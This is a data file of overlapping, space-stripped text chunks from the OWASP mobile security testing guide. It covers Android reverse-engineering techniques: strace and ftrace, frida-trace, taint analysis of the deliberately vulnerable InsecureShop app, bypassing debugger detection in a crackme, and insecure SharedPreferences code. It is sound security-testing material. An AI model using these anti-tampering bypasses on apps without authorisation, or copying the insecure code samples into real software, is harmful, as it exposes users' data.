178\\nDDMSalsooffersaconvenientheapdumpbuttonthatwilldumptheJavaheapofaprocesstoa.hproffile. TheAndroid StudiouserguidecontainsmoreinformationaboutTraceview. Tracing System Calls MovingdownalevelintheOShierarchy, youarriveatprivilegedfunctionsthatrequirethepowersoftheLinuxkernel. Thesefunctionsareavailabletonormalprocessesviathesystemcallinterface. Instrumentingandinterceptingcallsinto thekernelisaneffectivemethodforgettingaroughideaofwhatauserprocessisdoing, andoftenthemostefficient waytodeactivatelow-leveltamperingdefenses. Strace is a standard Linux utility that is not included with Android by default, but can be easily built from source via theAndroidNDK.Itmonitorstheinteractionbetweenprocessesandthekernel,beingaveryconvenientwaytomonitor systemcalls. However,there’sadownside: asstracedependsontheptracesystemcalltoattachtothetargetprocess, onceanti-debuggingmeasuresbecomeactiveitwillstopworking. Ifthe“Waitfordebugger”featureinSettings>Developeroptionsisunavailable,youcanuseashellscripttolaunch theprocessandimmediatelyattachstrace(notanelegantsolution,butitworks): while true;dopid=$(pgrep 'target_process' |head -1);if[[-n\"$pid\"]];then strace -s2000 -e\"!read\" -ff-p\"$pid\";break;fi;done Ftrace FtraceisatracingutilitybuiltdirectlyintotheLinuxkernel. Onarooteddevice,ftracecantracekernelsystemcallsmore transparentlythanstracecan(stracereliesontheptracesystemcalltoattachtothetargetprocess). Conveniently,thestockAndroidkernelonbothLollipopandMarshmallowincludeftracefunctionality. Thefeaturecanbe enabledwiththefollowingcommand: echo1 >/proc/sys/kernel/ftrace_enabled The /sys/kernel/debug/tracing directory holds all control and output files related to ftrace. The following files are foundinthisdirectory: • available_tracers: Thisfileliststheavailabletracerscompiledintothekernel. • current_tracer: Thisfilesetsordisplaysthecurrenttracer. • tracing_on: Echo “1”intothis filetoallow/start updateofthe",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 77
    }
  },
  {
    "text": "onceanti-debuggingmeasuresbecomeactiveitwillstopworking. Ifthe“Waitfordebugger”featureinSettings>Developeroptionsisunavailable,youcanuseashellscripttolaunch theprocessandimmediatelyattachstrace(notanelegantsolution,butitworks): while true;dopid=$(pgrep 'target_process' |head -1);if[[-n\"$pid\"]];then strace -s2000 -e\"!read\" -ff-p\"$pid\";break;fi;done Ftrace FtraceisatracingutilitybuiltdirectlyintotheLinuxkernel. Onarooteddevice,ftracecantracekernelsystemcallsmore transparentlythanstracecan(stracereliesontheptracesystemcalltoattachtothetargetprocess). Conveniently,thestockAndroidkernelonbothLollipopandMarshmallowincludeftracefunctionality. Thefeaturecanbe enabledwiththefollowingcommand: echo1 >/proc/sys/kernel/ftrace_enabled The /sys/kernel/debug/tracing directory holds all control and output files related to ftrace. The following files are foundinthisdirectory: • available_tracers: Thisfileliststheavailabletracerscompiledintothekernel. • current_tracer: Thisfilesetsordisplaysthecurrenttracer. • tracing_on: Echo “1”intothis filetoallow/start updateofthe ringbuffer. Echoing“0”will preventfurtherwrites intotheringbuffer. KProbes TheKProbesinterfaceprovidesanevenmorepowerfulwaytoinstrumentthekernel: itallowsyoutoinsertprobesinto (almost)arbitrarycodeaddresseswithinkernelmemory. KProbesinsertsabreakpointinstructionatthespecifiedaddress. Once the breakpoint is reached, control passes to the KProbes system, which then executes the user-defined handler function(s) and the original instruction. Besides being great for function tracing, KProbes can implement rootkit-like functionality,suchasfilehiding. JprobesandKretprobesareotherKProbes-basedprobetypesthatallowhookingoffunctionentriesandexits. The stock Android kernel comes without loadable module support, which is a problem because Kprobes are usually de- ployedaskernelmodules. ThestrictmemoryprotectiontheAndroidkerneliscompiledwithisanotherissuebecauseit preventsthepatchingofsomepartsofKernelmemory. Elfmaster’ssystemcallhookingmethodcausesaKernelpanicon stockLollipopandMarshmallowbecausethesys_call_tableisnon-writable. Youcan,however,useKProbesinasandbox bycompilingyourown,morelenientKernel(moreonthislater). Information Gathering - API Usage 179\\nPlatform: android TheAndroidplatformprovidesmanyin-builtlibrariesforfrequentlyusedfunctionalitiesinapplications,forexamplecryp- tography,Bluetooth,NFC,networkorlocationlibraries. Determiningthepresenceoftheselibrariesinanapplicationcan giveusvaluableinformationaboutitsnature. Forinstance,ifanapplicationisimportingjavax.crypto.Cipher,itindicatesthattheapplicationwillbeperformingsome kindofcryptographicoperation. Fortunately,cryptographiccallsareverystandardinnature,i.e,theyneedtobecalled inaparticularordertoworkcorrectly,thisknowledgecanbehelpfulwhenanalyzingcryptographyAPIs. Forexample,by lookingfortheCipher.getInstancefunction,wecandeterminethecryptographicalgorithmbeingused. Withsuchan approachwecandirectlymovetoanalyzingcryptographicassets,whichoftenareverycriticalinanapplication. Further informationonhowtoanalyzeAndroid’scryptographicAPIsisdiscussedinthesection“AndroidCryptographicAPIs”. Similarly, the above approach can be used to determine where and how an application is using NFC. For instance, an applicationusingHost-basedCardEmulationforperformingdigitalpaymentsmustusetheandroid.nfcpackage. There- fore, agoodstartingpointforNFCAPIanalysiswouldbetoconsulttheAndroidDeveloperDocumentationtogetsome ideas and start searching for critical functions such as processCommandApdu from the android.nfc.cardemulation. HostApduServiceclass. Retrieving Cross References Platform: android Java and Kotlin There are many RE tools that support retrieving Java cross references. For many of the GUI-based ones, this is usually donebyrightclickingonthedesiredfunctionandselectingthecorrespondingoption,e.g.ShowReferencestoinGhidra orFindUsageinjadx. Native Code SimilarlytoJavaanalysis,youcanalsouseGhidratoanalyzenativelibrariesandobtaincrossreferencesbyrightclicking thedesiredfunctionandselectingShowReferencesto. Method Tracing Platform: android Incontrasttomethodprofiling,whichtellsyouhowfrequentlyamethodisbeingcalled,methodtracinghelpsyoutoalso determine its input and output values. This technique can prove to be very useful when dealing with applications that haveabigcodebaseand/orareobfuscated. As we will discuss shortly in the next section, frida-trace offers out-of-the-box support for Android/iOS native code tracingandiOShighlevelmethodtracing. IfyoupreferaGUI-basedapproachyoucanusetoolssuchasRMS-Runtime MobileSecuritywhichenablesamorevisualexperienceaswellasincludeseveralconveniencetracingoptions. Get Open Files Platform: android Youcanuselsofwiththeflag-p <pid>toreturnthelistofopenfilesforthespecifiedprocess. Seethemanpagefor moreoptions. 180\\n##lsof-p6233 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODENAME .foobar.c 6233 u0_a97 cwd DIR 0,1 0 1/ .foobar.c 6233 u0_a97 rtd DIR 0,1 0 1/ .foobar.c 6233 u0_a97 txt REG 259,11 23968 399/system/bin/app_process64 .foobar.c 6233 u0_a97 mem unknown /dev/ashmem/dalvik-mainspace (regionspace)(deleted) .foobar.c 6233 u0_a97 mem REG 253,0 2797568 1146914/data/dalvik-cache/arm64/system@framework@boot.art .foobar.c 6233 u0_a97 mem REG 253,0 1081344 1146915/data/dalvik-cache/arm64/system@framework@boot-core-libart.art ... Intheaboveoutput,themostrelevantfieldsforusare: • NAME:pathofthefile. • TYPE:typeofthefile,forexample,fileisadirectoryoraregularfile. Thiscanbeextremelyusefultospotunusualfileswhenmonitoringapplicationsusingobfuscationorotheranti-reverse engineeringtechniques,withouthavingtoreversethecode. Forinstance,anapplicationmightbeperformingencryption- decryptionofdataandstoringitinafiletemporarily. Disassembling Code to Smali Platform: android Ifyouwanttoinspecttheapp’ssmalicode(insteadofJava),youcanopenyourAPKinAndroidStudiobyclickingProfile ordebugAPKfromthe“Welcomescreen”(evenifyoudon’tintendtodebugityoucantakealookatthesmalicode). Alternatively you can use apktool to extract and disassemble resources directly from the APK archive and disassemble Javabytecodetosmali. apktoolallowsyoutoreassemblethepackage,whichisusefulforpatchingtheapporapplying changestoe.g.theAndroidManifest. Native Code Tracing Platform: android Native methods tracing can be performed with relative ease compared to Java method tracing. frida-trace is a CLI toolfordynamicallytracingfunctioncalls. Itmakestracingnativefunctionstrivialandcanbeveryusefulforcollecting informationaboutanapplication. Inordertousefrida-trace,aFridaservershouldberunningonthedevice. Anexamplefortracinglibc’sopenfunction using frida-trace is demonstrated below, where -U connects to the USB device and -i specifies the function to be includedinthetrace. frida-trace -U-i\"open\" com.android.chrome 181\\nNotehow,bydefault,onlytheargumentspassedtothefunctionareshown,butnotthereturnvalues. Underthehood, frida-tracegeneratesonelittleJavaScripthandlerfilepermatchedfunctionintheauto-generated__handlers__folder, whichFridatheninjectsintotheprocess. Youcaneditthesefilesformoreadvancedusagesuchasobtainingthereturn valueofthefunctions,theirinputparameters,accessingthememory,etc. CheckFrida’sJavaScriptAPIformoredetails. Inthiscase,thegeneratedscriptwhichtracesallcallstotheopenfunctioninlibc.soislocatedin__handlers__/libc. so/open.js,itlooksasfollows: { onEnter:function (log,args,state){ log('open(' + 'path=\"' +args[0].readUtf8String()+'\"'+ ',oflag=' +args[1]+ ')'); }, onLeave:function (log,retval,state){ log('\\treturn:' +retval); \\\\edited } } Intheabovescript,onEntertakescareofloggingthecallstothisfunctionanditstwoinputparametersintherightformat. YoucanedittheonLeaveeventtoprintthereturnvaluesasshownabove. Note that libc is a well-known library, Frida is able to derive the input parameters of its open function and auto- maticallylogthemcorrectly. Butthiswon’tbethecaseforotherlibrariesorforAndroidKotlin/Javacode. Inthat case,youmaywanttoobtainthesignaturesofthefunctionsyou’reinterestedinbyreferringtoAndroidDevelopers 182\\ndocumentationorbyreverseengineertheappfirst. Anotherthingtonoticeintheoutputaboveisthatit’scolorized. Anapplicationcanhavemultiplethreadsrunning,and each thread can call the open function independently. By using such a color scheme, the output can be easily visually segregatedforeachthread. frida-traceisaveryversatiletoolandtherearemultipleconfigurationoptionsavailablesuchas: • Including-Iandexcluding-Xentiremodules. • TracingallJNIfunctionsinanAndroidapplicationusing-i \"Java_*\"(notetheuseofaglob*tomatchallpossible functionsstartingwith“Java_”). • Tracingfunctionsbyaddresswhennofunctionnamesymbolsareavailable(strippedbinaries),e.g.-a \"libjpeg. so!0x4793c\". frida-trace",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 78
    }
  },
  {
    "text": "derive the input parameters of its open function and auto- maticallylogthemcorrectly. Butthiswon’tbethecaseforotherlibrariesorforAndroidKotlin/Javacode. Inthat case,youmaywanttoobtainthesignaturesofthefunctionsyou’reinterestedinbyreferringtoAndroidDevelopers 182\\ndocumentationorbyreverseengineertheappfirst. Anotherthingtonoticeintheoutputaboveisthatit’scolorized. Anapplicationcanhavemultiplethreadsrunning,and each thread can call the open function independently. By using such a color scheme, the output can be easily visually segregatedforeachthread. frida-traceisaveryversatiletoolandtherearemultipleconfigurationoptionsavailablesuchas: • Including-Iandexcluding-Xentiremodules. • TracingallJNIfunctionsinanAndroidapplicationusing-i \"Java_*\"(notetheuseofaglob*tomatchallpossible functionsstartingwith“Java_”). • Tracingfunctionsbyaddresswhennofunctionnamesymbolsareavailable(strippedbinaries),e.g.-a \"libjpeg. so!0x4793c\". frida-trace -U-i\"Java_*\" com.android.chrome Manybinariesarestrippedanddon’thavefunctionnamesymbolsavailablewiththem. Insuchcases,afunctioncanbe tracedusingitsaddressaswell. frida-trace -p1372 -a\"libjpeg.so!0x4793c\" Frida12.10introducesanewusefulsyntaxtoqueryJavaclassesandmethodsaswellasJavamethodtracingsupportfor frida-tracevia-j(startingonfrida-tools8.0). • In Frida scripts: e.g. Java.enumerateMethods('*youtube*!on*') uses globs to take all classes that include “youtube”aspartoftheirnameandenumerateallmethodsstartingwith“on”. • Infrida-trace: e.g.-j '*!*certificate*/isu'triggersacase-insensitivequery(i),includingmethodsignatures (s)andexcludingsystemclasses(u). RefertotheReleaseNotesforFrida12.10formoredetailsonthisnewfeature. Tolearnmoreaboutalloptionsforadvanced usage,checkthedocumentationontheofficialFridawebsite. Information Gathering - Network Communication Platform: android Most of the apps you might encounter connect to remote endpoints. Even before you perform any dynamic analysis (e.g.trafficcaptureandanalysis),youcanobtainsomeinitialinputsorentrypointsbyenumeratingthedomainstowhich theapplicationissupposedtocommunicateto. Typicallythesedomainswillbepresentasstringswithinthebinaryoftheapplication. Onewaytoachievethisisbyusing automatedtoolssuchasAPKEnumorMobSF.Alternatively,youcangrepforthedomainnamesbyusingregularexpres- sions. Forthisyoucantargettheappbinarydirectlyorreverseengineeritandtargetthedisassembledordecompiled code. Thelatteroptionhasaclearadvantage: itcanprovideyouwithcontext,asyou’llbeabletoseeinwhichcontext eachdomainisbeingused(e.g.classandmethod). From here on you can use this information to derive more insights which might be of use later during your analysis, e.g.youcouldmatchthedomainstothepinnedcertificatesortheNetworkSecurityConfigurationfileorperformfurther reconnaissance on domain names to know more about the target environment. When evaluating an application it is importanttochecktheNetworkSecurityConfigurationfile,asoften(lesssecure)debugconfigurationsmightbepushed intofinalreleasebuildsbymistake. Theimplementationandverificationofsecureconnectionscanbeanintricateprocessandtherearenumerousaspects to consider. For instance, many applications use other protocols apart from HTTP such as XMPP or plain TCP packets, or perform certificate pinning in an attempt to deter MITM attacks but unfortunately have severe logical bugs in its implementationoraninherentlywrongsecuritynetworkconfiguration. Rememberthatinmostofthecases,justusingstaticanalysiswillnotbeenoughandmighteventurntobeextremely inefficient when compared to the dynamic alternatives which will get much more reliable results (e.g. using an inter- ceptor proxy). In this section we’ve just slightly touched the surface, please refer to the section “Basic Network Mon- itoring/Sniffing” in the “Android Basic Security Testing” chapter and also check the test cases in the “Android Network Communication”chapter. 183\\nSandbox Inspection Platform: android Theapplicationdataisstoredinasandboxeddirectorypresentat/data/data/<app_package_name>. Thecontentofthis directoryhasalreadybeendiscussedindetailinthe“AccessingAppDataDirectories”section. Automated Static Analysis Platform: android Youshouldusetoolsforefficientstaticanalysis. Theyallowthetestertofocusonthemorecomplicatedbusinesslogic. A plethoraofstaticcodeanalyzersareavailable,rangingfromopensourcescannerstofull-blownenterprise-readyscanners. Thebesttoolforthejobdependsonbudget,clientrequirements,andthetester’spreferences. Somestaticanalyzersrelyontheavailabilityofthesourcecode; otherstakethecompiledAPKasinput. Keepinmind thatstaticanalyzersmaynotbeabletofindallproblemsbythemselveseventhoughtheycanhelpusfocusonpotential problems. Revieweachfindingcarefullyandtrytounderstandwhattheappisdoingtoimproveyourchancesoffinding vulnerabilities. Configurethestaticanalyzerproperlytoreducethelikelihoodoffalsepositivesandmaybeonlyselectseveralvulnerability categoriesinthescan. Theresultsgeneratedbystaticanalyzerscanotherwisebeoverwhelming,andyoureffortscan becounterproductiveifyoumustmanuallyinvestigatealargereport. ThereareseveralopensourcetoolsforautomatedsecurityanalysisofanAPK. • Androbugs • JAADAS(archived) • MobSF • QARK Listing Installed Apps Platform: android When targeting apps that are installed on the device, you’ll first have to figure out the correct package name of the applicationyouwanttoanalyze. Youcanretrievetheinstalledappseitherbyusingpm(AndroidPackageManager)orby usingfrida-ps: $adbshellpmlistpackages package:sg.vantagepoint.helloworldjni package:eu.chainfire.supersu package:org.teamsik.apps.hackingchallenge.easy package:org.teamsik.apps.hackingchallenge.hard package:sg.vp.owasp_mobile.omtg_android Youcanincludeflagstoshowonlythirdpartyapps(-3)andthelocationoftheirAPKfile(-f),whichyoucanuseafterwards todownloaditviaadb pull: $adbshellpmlistpackages -3-f package:/data/app/sg.vantagepoint.helloworldjni-1/base.apk=sg.vantagepoint.helloworldjni package:/data/app/eu.chainfire.supersu-1/base.apk=eu.chainfire.supersu package:/data/app/org.teamsik.apps.hackingchallenge.easy-1/base.apk=org.teamsik.apps.hackingchallenge.easy package:/data/app/org.teamsik.apps.hackingchallenge.hard-1/base.apk=org.teamsik.apps.hackingchallenge.hard package:/data/app/sg.vp.owasp_mobile.omtg_android-kR0ovWl9eoU_yh0jPJ9caQ==/base.apk=sg.vp.owasp_mobile.omtg_android Thisisthesameasrunningadb shell pm path <app_package_id>onanapppackageID: $adbshellpmpathsg.vp.owasp_mobile.omtg_android package:/data/app/sg.vp.owasp_mobile.omtg_android-kR0ovWl9eoU_yh0jPJ9caQ==/base.apk 184\\nUsefrida-ps -Uaitogetallapps(-a)currentlyinstalled(-i)ontheconnectedUSBdevice(-U): $frida-ps -Uai PID Name Identifier ----- ---------------------------------------- --------------------------------------- 766 AndroidSystem android 21228 Attackmeifucan sg.vp.owasp_mobile.omtg_android 4281 Termux com.termux - Uncrackable1 sg.vantagepoint.uncrackable1 NotethatthisalsoshowsthePIDoftheappsthatarerunningatthemoment. Takeanoteofthe“Identifier”andthePID ifanyasyou’llneedthemafterwards. Dynamic Analysis on Android Platform: android TBD Taint Analysis Platform: android Taint analysis is an information flow analysis technique that tracks the flow of sensitive information within a program. Forexample, itcandeterminewhethergeolocationdatacollectedinanAndroidappisbeingtransmittedtothird-party domains. Intaintanalysis,dataflowsfroma“source”toa“sink”. Asourceiswheresensitiveinformationoriginates,andasinkis wherethisinformationisultimatelyutilized. Forinstance,wecandetermineifthedeviceIDretrievedbyagetDeviceId() functionistransmittedasatextmessageviaanotherfunctionsendTextMessage(). Inthisscenario,getDeviceId()is thesource,andsendTextMessage()isthesink. Ifadirectpathexistsbetweenthem,it’scalledaleak. Inlargeapplications,manualinformationflowanalysiscanbeverytimeconsumingandinaccurate. Taintanalysisauto- mates this, with two main methods: static and dynamic. The former examines code without running it, offering broad coveragebutpotentiallyyieldingfalsepositives. Incontrast,dynamicanalysisobservesreal-timeapplicationexecution, providingactualcontextbutpossiblyoverlookinguntriggeredissues. Athoroughcomparisonofthesetechniquesisbe- yondthissection’sscope. Therearemultipletoolswhichperformtaintanalysisonnativecode,includingTritonandbincat. However,inthissection, we’ll primarily focus on Android Java code and utilize FlowDroid for the taint analysis. Another notable tool supporting taintanalysisforAndroidappsisGDA. Forourdemonstration,we’lluseFlowDroid’scommandlinetooltoperformtaintanalysisontheInsecureShopv1.0appli- cation. TheInsecureShopappacceptsausernameandpasswordasinputandstoresthemintheapp’ssharedpreferences. In ourtaintanalysis, we’reinterestedinhowthisstoredusernameandpasswordareused. Inthiscontext, theusername andpasswordarethesensitiveinformation,andreadingfromsharedpreferencesisthesource. Thesinkinthisanalysis couldbevariousoperations,suchassendinginfooverthenetwork,transmittinginfoviaanIntent,orstoringinfoinan externalfile. TouseFlowDroid,firstly,weneedtoprovideaninputlistofpotentialsourcesandsinkstoevaluatefor. Inourcase,reading fromsharedpreferenceswillbethesource,whileaddingparameterstoanIntentwillbethesink. Theconfigurationfile willlookasfollows(we’llnameit“source_sink.txt”): <android.content.SharedPreferences:java.lang.StringgetString(java.lang.String,java.lang.String)>->_SOURCE_ <android.content.Intent:android.content.IntentputExtra(java.lang.String,java.lang.CharSequence)>->_SINK_ <android.content.Intent:android.content.IntentputExtra(java.lang.String,char)>->_SINK_ <android.content.Intent:android.content.IntentputExtra(java.lang.String,java.lang.String)>->_SINK_ ToinvokeFlowDroidviathecommandline,usethefollowingcommand: 185\\njava-jarsoot-infoflow-cmd/target/soot-infoflow-cmd-jar-with-dependencies.jar\\ -aInsecureShop.apk\\ -pAndroid/Sdk/platforms\\ -ssource_sink.txt [main]INFOsoot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow-Thesinkvirtualinvoker2.<android.content.Intent:android.content.Intent ↪ putExtra(java.lang.String,java.lang.String)>(\"password\",$r5)inmethod<com.insecureshop.AboutUsActivity:voidonSendData(android.view.View)>wascalled ↪ withvaluesfromthefollowingsources: [main]INFOsoot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow--$r1=interfaceinvoke$r2.<android.content.SharedPreferences:java.lang.String ↪ getString(java.lang.String,java.lang.String)>(\"password\",\"\")inmethod<com.insecureshop.util.Prefs:java.lang.StringgetPassword()> ... [main]INFOsoot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow-Thesinkvirtualinvoker2.<android.content.Intent:android.content.Intent ↪ putExtra(java.lang.String,java.lang.String)>(\"username\",$r4)inmethod<com.insecureshop.AboutUsActivity:voidonSendData(android.view.View)>wascalled ↪ withvaluesfromthefollowingsources: [main]INFOsoot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow--$r1=interfaceinvoke$r2.<android.content.SharedPreferences:java.lang.String ↪ getString(java.lang.String,java.lang.String)>(\"username\",\"\")inmethod<com.insecureshop.util.Prefs:java.lang.StringgetUsername()>",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 79
    }
  },
  {
    "text": "taint analysis. Another notable tool supporting taintanalysisforAndroidappsisGDA. Forourdemonstration,we’lluseFlowDroid’scommandlinetooltoperformtaintanalysisontheInsecureShopv1.0appli- cation. TheInsecureShopappacceptsausernameandpasswordasinputandstoresthemintheapp’ssharedpreferences. In ourtaintanalysis, we’reinterestedinhowthisstoredusernameandpasswordareused. Inthiscontext, theusername andpasswordarethesensitiveinformation,andreadingfromsharedpreferencesisthesource. Thesinkinthisanalysis couldbevariousoperations,suchassendinginfooverthenetwork,transmittinginfoviaanIntent,orstoringinfoinan externalfile. TouseFlowDroid,firstly,weneedtoprovideaninputlistofpotentialsourcesandsinkstoevaluatefor. Inourcase,reading fromsharedpreferenceswillbethesource,whileaddingparameterstoanIntentwillbethesink. Theconfigurationfile willlookasfollows(we’llnameit“source_sink.txt”): <android.content.SharedPreferences:java.lang.StringgetString(java.lang.String,java.lang.String)>->_SOURCE_ <android.content.Intent:android.content.IntentputExtra(java.lang.String,java.lang.CharSequence)>->_SINK_ <android.content.Intent:android.content.IntentputExtra(java.lang.String,char)>->_SINK_ <android.content.Intent:android.content.IntentputExtra(java.lang.String,java.lang.String)>->_SINK_ ToinvokeFlowDroidviathecommandline,usethefollowingcommand: 185\\njava-jarsoot-infoflow-cmd/target/soot-infoflow-cmd-jar-with-dependencies.jar\\ -aInsecureShop.apk\\ -pAndroid/Sdk/platforms\\ -ssource_sink.txt [main]INFOsoot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow-Thesinkvirtualinvoker2.<android.content.Intent:android.content.Intent ↪ putExtra(java.lang.String,java.lang.String)>(\"password\",$r5)inmethod<com.insecureshop.AboutUsActivity:voidonSendData(android.view.View)>wascalled ↪ withvaluesfromthefollowingsources: [main]INFOsoot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow--$r1=interfaceinvoke$r2.<android.content.SharedPreferences:java.lang.String ↪ getString(java.lang.String,java.lang.String)>(\"password\",\"\")inmethod<com.insecureshop.util.Prefs:java.lang.StringgetPassword()> ... [main]INFOsoot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow-Thesinkvirtualinvoker2.<android.content.Intent:android.content.Intent ↪ putExtra(java.lang.String,java.lang.String)>(\"username\",$r4)inmethod<com.insecureshop.AboutUsActivity:voidonSendData(android.view.View)>wascalled ↪ withvaluesfromthefollowingsources: [main]INFOsoot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow--$r1=interfaceinvoke$r2.<android.content.SharedPreferences:java.lang.String ↪ getString(java.lang.String,java.lang.String)>(\"username\",\"\")inmethod<com.insecureshop.util.Prefs:java.lang.StringgetUsername()> ... [main]INFOsoot.jimple.infoflow.android.SetupApplication-Found2leaks Theoutputalsousesthejimpleintermediaterepresentationandrevealstwoleaksintheapplication,eachcorresponding to the username and password. Given that the InsecureShop app is open-source, we can refer to its source code to validatethefindings,asshownbelow: //file:AboutActivity.kt funonSendData(view:View){ valuserName =Prefs.username!! valpassword =Prefs.password!! valintent =Intent(\"com.insecureshop.action.BROADCAST\") intent.putExtra(\"username\",userName) intent.putExtra(\"password\",password) sendBroadcast(intent) textView.text =\"InsecureShopisanintentionallydesignedvulnerableandroidappbuiltinKotlin.\" } Taint analysis is especially beneficial for automating data flow analysis in intricate applications. However, given the complexityofsomeapps,theaccuracyofsuchtoolscanvary. Thus,it’sessentialforreviewerstofindabalancebetween theaccuracyoftoolsandthetimespentonmanualanalysis. Waiting for the Debugger Platform: android TheUnCrackableAppforAndroidLevel1isnotstupid: itnoticesthatithasbeenrunindebuggablemodeandreactsby shuttingdown. Amodaldialogisshownimmediately,andthecrackmeterminatesonceyoutap“OK”. Fortunately,Android’s“Developeroptions”containtheuseful“WaitforDebugger”feature,whichallowsyoutoautomat- icallysuspendanappduringstartupuntilaJDWPdebuggerconnects. Withthisfeature,youcanconnectthedebugger beforethedetectionmechanismruns,andtrace,debug,anddeactivatethatmechanism. It’sreallyanunfairadvantage, but,ontheotherhand,reverseengineersneverplayfair! 186\\nIntheDeveloperoptions,pickUncrackable1asthedebuggingapplicationandactivatethe“WaitforDebugger”switch. 187\\nNote: Even with ro.debuggable set to “1” in default.prop, an app won’t show up in the “debug app” list unless the android:debuggableflagissetto\"true\"intheAndroidManifest. Emulation-based Analysis Platform: android The Android emulator is based on QEMU, a generic and open source machine emulator. QEMU emulates a guest CPU bytranslatingtheguestinstructionson-the-flyintoinstructionsthehostprocessorcanunderstand. Eachbasicblockof guestinstructionsisdisassembledandtranslatedintoanintermediaterepresentationcalledTinyCodeGenerator(TCG). TheTCGblockiscompiledintoablockofhostinstructions,storedinacodecache,andexecuted. Afterexecutionofthe basicblock,QEMUrepeatstheprocessforthenextblockofguestinstructions(orloadsthealreadytranslatedblockfrom thecache). Thewholeprocessiscalleddynamicbinarytranslation. BecausetheAndroidemulatorisaforkofQEMU,itcomeswithallQEMUfeatures,includingmonitoring,debugging,and tracingfacilities. QEMU-specificparameterscanbepassedtotheemulatorwiththe-qemucommandlineflag. Youcan useQEMU’sbuilt-intracingfacilitiestologexecutedinstructionsandvirtualregistervalues. StartingQEMUwiththe-d commandlineflagwillcauseittodumptheblocksofguestcode,microoperations,orhostinstructionsbeingexecuted. Withthe-d_asmflag,QEMUlogsallbasicblocksofguestcodeastheyenterQEMU’stranslationfunction. Thefollowing commandlogsalltranslatedblockstoafile: emulator -show-kernel -avd Nexus_4_API_19 -snapshot default-boot -no-snapshot-save -qemu -din_asm,cpu 2>/tmp/qemu.log Unfortunately,generatingacompleteguestinstructiontracewithQEMUisimpossiblebecausecodeblocksarewrittento thelogonlyatthetimetheyaretranslated,notwhenthey’retakenfromthecache. Forexample,ifablockisrepeatedly executed in a loop, only the first iteration will be printed to the log. There’s no way to disable TB caching in QEMU (besideshackingthesourcecode). Nevertheless,thefunctionalityissufficientforbasictasks,suchasreconstructingthe disassemblyofanativelyexecutedcryptographicalgorithm. 188\\nReverse Engineering Android Apps Platform: android Android’sopennessmakesitafavorableenvironmentforreverseengineers,offeringbigadvantagesthatarenotavailable withiOS.BecauseAndroidisopen-source,youcanstudyitssourcecodeattheAndroidOpenSourceProject(AOSP)and modifytheOSanditsstandardtoolsanywayyouwant. Evenonstandardretaildevices,itispossibletodothingslike activatingdevelopermodeandsideloadingappswithoutjumpingthroughmanyhoops. Fromthepowerfultoolsshipping withtheSDKtothewiderangeofavailablereverseengineeringtools,there’salotofnicetiestomakeyourlifeeasier. However,therearealsoafewAndroid-specificchallenges. Forexample,you’llneedtodealwithbothJavabytecodeand nativecode. JavaNativeInterface(JNI)issometimesdeliberatelyusedtoconfusereverseengineers(tobefair,thereare legitimatereasonsforusingJNI,suchasimprovingperformanceorsupportinglegacycode). Developerssometimesuse thenativelayerto“hide”dataandfunctionality,andtheymaystructuretheirappssuchthatexecutionfrequentlyjumps betweenthetwolayers. You’llneedatleastaworkingknowledgeofboththeJava-basedAndroidenvironmentandtheLinuxOSandKernel, on which Android is based. You’ll also need the right toolset to deal with both the bytecode running on the Java virtual machineandthenativecode. Repackaging Apps Platform: android Ifyouneedtotestonanon-jailbrokendeviceyoushouldlearnhowtorepackageanapptoenabledynamictestingon it. Useacomputertoperformallthestepsindicatedinthearticle“PatchingAndroidApplications”fromtheobjectionWiki. Onceyou’redoneyou’llbeabletopatchanAPKbycallingtheobjectioncommand: objectionpatchapk --source app-release.apk Thepatchedapplicationthenneedstobeinstalledusingadb,asexplainedin“InstallingApps”. Thisrepackagingmethodisenoughformostusecases. Formoreadvancedrepackaging,referto“AndroidTampering andReverseEngineering-Patching,RepackagingandRe-Signing”. 189\\nAndroid Data Storage Overview Thischapterdiscussestheimportanceofsecuringsensitivedata,likeauthenticationtokensandprivateinformation,vital formobilesecurity. We’lllookatAndroid’sAPIsforlocaldatastorageandsharebestpractices. While it’s preferable to limit sensitive data on local storage, or avoid it at all whenever possible, practical use cases oftennecessitateuserdatastorage. Forexample,toimproveuserexperience,appscacheauthenticationtokenslocally, circumventingtheneedforcomplexpasswordentryateachappstart. Appsmayalsoneedtostorepersonallyidentifiable information(PII)andothersensitivedata. Sensitivedatacanbecomevulnerableifimproperlyprotected,potentiallystoredinvariouslocations,includingthedevice oranexternalSDcard. It’simportanttoidentifytheinformationprocessedbythemobileappandclassifywhatcounts as sensitive data. Check out the “Identifying Sensitive Data” section in the “Mobile App Security Testing” chapter for data classification details. Refer to Security Tips for Storing Data in the Android developer’s guide for comprehensive insights. Sensitive information disclosure risks include potential information decryption, social engineering attacks (if PII is dis- closed), account hijacking (if session information or an authentication token is disclosed), and app exploitation with a paymentoption. In addition to data protection, validate and sanitize data from any storage source. This includes checking correct data typesandimplementingcryptographiccontrols,suchasHMACs,fordataintegrity. Androidoffersvariousdatastoragemethods,tailoredtousers,developers,andapplications. Commonpersistentstorage techniquesinclude: • SharedPreferences • SQLiteDatabases • FirebaseDatabases • RealmDatabases • InternalStorage • ExternalStorage • Keystore Additionally,otherAndroidfunctionsthatcanresultindatastorageandshouldbetestedinclude: • LoggingFunctions • AndroidBackups • ProcessesMemory • KeyboardCaches • Screenshots Understanding each relevant data storage function is crucial for performing the appropriate test cases. This overview providesabriefoutlineofthesedatastoragemethodsandpointstesterstofurtherrelevantdocumentation. Shared Preferences The SharedPreferences API is commonly used to permanently save small collections of key-value pairs. Data stored in a SharedPreferences object is written to a plain-text XML file. The SharedPreferences object can be declared world- readable(accessibletoallapps)orprivate. MisuseoftheSharedPreferencesAPIcanoftenleadtoexposureofsensitive data. Considerthefollowingexample: ExampleforJava: SharedPreferencessharedPref =getSharedPreferences(\"key\",MODE_WORLD_READABLE); SharedPreferences.Editor editor =sharedPref.edit();",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 80
    }
  },
  {
